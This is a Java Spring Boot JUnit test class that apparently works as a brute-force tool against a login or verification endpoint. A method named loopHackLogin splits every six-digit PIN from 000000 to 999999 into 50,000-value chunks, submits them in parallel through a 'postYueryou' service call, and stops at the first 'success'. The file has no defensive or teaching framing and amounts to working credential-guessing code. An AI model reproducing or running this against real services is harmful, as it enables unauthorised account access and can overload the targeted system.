package cn.colams.biz.haipi111;


import cn.colams.biz.dalTest;
import cn.colams.common.utils.JacksonSerializerUtil;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executor;
import java.util.stream.Collectors;

@RunWith(SpringRunner.class)
@SpringBootTest(classes = dalTest.class)
@SpringBootApplication(scanBasePackages = {"cn.colams"})
public class YueryouBizTest {


    private static final Logger logger = LoggerFactory.getLogger(YueryouBizTest.class);

    private static final char[] intArray = new char[]
            {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};

    private static final char[] arrayArray = new char[]
            {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

    @Autowired
    Executor taskExecutor;

    @Autowired
    YueryouBiz yueryouBiz;

    @Test
    public void testPostYueryou() throws ExecutionException, InterruptedException {
        List<String> stepList = initArray();
        List<CompletableFuture<String>> futures = stepList.stream()
                .map(e -> CompletableFuture.supplyAsync(() ->
                                loopHackLogin(e),
                        taskExecutor))
                .collect(Collectors.toList());

        CompletableFuture<Object> completableFuture = CompletableFuture.anyOf(futures.toArray(new CompletableFuture[futures.size()]));
        Object obj = completableFuture.get();
        logger.info(String.valueOf(obj));
    }

    @Test
    public void testInitArray() {
        List<String> arrays = initArray();
        logger.info(JacksonSerializerUtil.serialize(arrays));
    }

    private List<String> initArray() {
        int step = 50000;
        List<String> arrays = new ArrayList<>();
        for (int i = 0; i * step <= 999999; i++) {
            String ms = String.format("%s-%s", i * step, (i + 1) * step);
            arrays.add(ms);
        }
        return arrays;
    }

    private String loopHackLogin(String step) {
        List<Integer> array = Arrays.stream(step.split("-")).map(e -> Integer.valueOf(e)).collect(Collectors.toList());

        char[] charArray = new char[6];
        String password = null;
        for (int i = array.get(0); i < array.get(1); i++) {
            String tem = String.valueOf(i);
            char[] tempChar = tem.toCharArray();
            int n = charArray.length - tempChar.length;
            if (n > 0) {
                for (int j = 0; j < n; j++) {
                    charArray[j] = '0';
                }

                for (int j = 0; j < tempChar.length; j++) {
                    charArray[n + j] = tempChar[j];
                }

            } else {
                charArray = tempChar;
            }

            String pwd = String.copyValueOf(charArray);
            String result = yueryouBiz.postYueryou(pwd);
            logger.info(result);
            if (result.equalsIgnoreCase("success")) {
                password = pwd;
                break;
            }
        }
        return password;
    }


    private char[] initCharArrayTemp(char[] charArray) {
        char[] charArrayTemp = new char[6];
        charArrayTemp[0] = 'w';
        charArrayTemp[1] = 'a';
        charArrayTemp[2] = charArray[0];
        charArrayTemp[3] = charArray[1];
        charArrayTemp[4] = charArray[2];
        charArrayTemp[5] = charArray[3];
        return charArrayTemp;
    }

}